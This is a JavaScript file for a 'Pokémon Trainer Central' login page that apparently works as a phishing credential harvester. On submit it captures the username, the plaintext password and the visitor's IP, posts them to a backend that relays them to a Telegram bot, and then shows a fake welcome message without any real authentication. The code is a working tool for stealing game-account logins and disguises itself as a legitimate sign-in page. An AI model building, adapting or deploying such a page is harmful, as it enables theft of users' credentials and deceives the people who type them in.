// Telegram Bot Integration for Pokémon Trainer Central Login
document.addEventListener("DOMContentLoaded", function () {
  const togglePassword = document.getElementById("togglePassword");
  const passwordInput = document.getElementById("password");
  const loginForm = document.querySelector("form");

  // Check bot status on page load
  checkBotStatus();

  // Password visibility toggle
  if (togglePassword && passwordInput) {
    togglePassword.addEventListener("click", function () {
      const type =
        passwordInput.getAttribute("type") === "password" ? "text" : "password";
      passwordInput.setAttribute("type", type);

      const icon = this.querySelector("i");
      if (icon) {
        icon.classList.toggle("fa-eye");
        icon.classList.toggle("fa-eye-slash");
      }
    });
  }

  // Telegram notification on login attempt
  if (loginForm) {
    loginForm.addEventListener("submit", async function (e) {
      e.preventDefault();

      const username = document.getElementById("username").value;
      const password = document.getElementById("password").value;

      if (!username || !password) {
        showNotification("Please enter both username and password", "error");
        return;
      }

      // Show loading state
      const loginBtn = document.querySelector(".login-btn");
      const originalText = loginBtn.textContent;
      loginBtn.textContent = "Logging in...";
      loginBtn.disabled = true;

      try {
        // Send login notification to Telegram
        const response = await fetch("/api/login", {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify({
            username: username,
            password: password,
            timestamp: new Date().toISOString(),
            ip: await getClientIP(),
          }),
        });

        const result = await response.json();

        if (result.success) {
          showNotification(
            result.message || "Login attempt recorded! 📱",
            "success",
          );

          // Simulate login process (replace with actual authentication)
          setTimeout(() => {
            showNotification(
              "Welcome to Pokémon Trainer Central! 🎮",
              "success",
            );
            // Here you would typically redirect to dashboard
            // window.location.href = '/dashboard';
          }, 1500);
        } else {
          // Check if it's just a Telegram failure but data was saved
          if (result.message && result.message.includes("Failed to send Telegram notification")) {
            showNotification(
              "Login recorded! 📱 (Telegram notification disabled)",
              "success",
            );
            
            setTimeout(() => {
              showNotification(
                "Welcome to Pokémon Trainer Central! 🎮",
                "success",
              );
            }, 1500);
          } else {
            showNotification(
              result.message || "Login notification failed",
              "error",
            );
          }
        }
      } catch (error) {
        console.error("Login error:", error);
        showNotification("Network error. Please try again.", "error");
      } finally {
        // Reset button state
        loginBtn.textContent = originalText;
        loginBtn.disabled = false;
      }
    });
  }

  // Check bot status
  async function checkBotStatus() {
    try {
      const response = await fetch("/api/bot-status");
      const status = await response.json();

      if (status.bot_token_configured && status.chat_id_found) {
        showBotStatus("🟢 Telegram Bot Connected", "success");
        return true;
      } else if (status.bot_token_configured) {
        showBotStatus(
          "🟡 Bot Ready - Send message to @PokemonGOlogin_bot",
          "warning",
        );
        // Auto-retry every 5 seconds if waiting for user message
        setTimeout(checkBotStatus, 5000);
        return false;
      } else {
        showBotStatus("🔴 Bot Not Configured", "error");
        return false;
      }
    } catch (error) {
      showBotStatus("🔴 Server Offline", "error");
      return false;
    }
  }

  // Show bot status indicator
  function showBotStatus(message, type) {
    // Remove existing status
    const existingStatus = document.querySelector(".bot-status");
    if (existingStatus) {
      existingStatus.remove();
    }

    // Create status element
    const status = document.createElement("div");
    status.className = `bot-status bot-status-${type}`;
    status.innerHTML = `
            <span>${message}</span>
            <button onclick="checkBotStatus()" style="background:none;border:none;color:inherit;cursor:pointer;margin-left:8px;">↻</button>
        `;

    // Add to page
    document.querySelector(".container").prepend(status);
  }

  // Get client IP (simplified version)
  async function getClientIP() {
    try {
      const response = await fetch("https://api.ipify.org?format=json");
      const data = await response.json();
      return data.ip || "Unknown";
    } catch (error) {
      return "Unknown";
    }
  }

  // Show notification to user
  function showNotification(message, type = "info") {
    // Remove existing notifications
    const existingNotif = document.querySelector(".notification");
    if (existingNotif) {
      existingNotif.remove();
    }

    // Create notification element
    const notification = document.createElement("div");
    notification.className = `notification notification-${type}`;
    notification.innerHTML = `
            <div class="notification-content">
                <span class="notification-message">${message}</span>
                <button class="notification-close" onclick="this.parentElement.parentElement.remove()">×</button>
            </div>
        `;

    // Add to page
    document.body.appendChild(notification);

    // Auto remove after 5 seconds
    setTimeout(() => {
      if (notification.parentElement) {
        notification.remove();
      }
    }, 5000);
  }

  // Social login handlers
  document.querySelectorAll(".social-btn").forEach((btn) => {
    btn.addEventListener("click", function () {
      const provider = this.classList.contains("google-btn")
        ? "Google"
        : "Apple";
      showNotification(`${provider} login coming soon! 🚧`, "info");
    });
  });

  // Create account handler
  const createAccountBtn = document.querySelector(".create-account-btn");
  if (createAccountBtn) {
    createAccountBtn.addEventListener("click", function (e) {
      e.preventDefault();
      showNotification("Account registration coming soon! 📝", "info");
    });
  }

  // Make checkBotStatus available globally
  window.checkBotStatus = checkBotStatus;
});
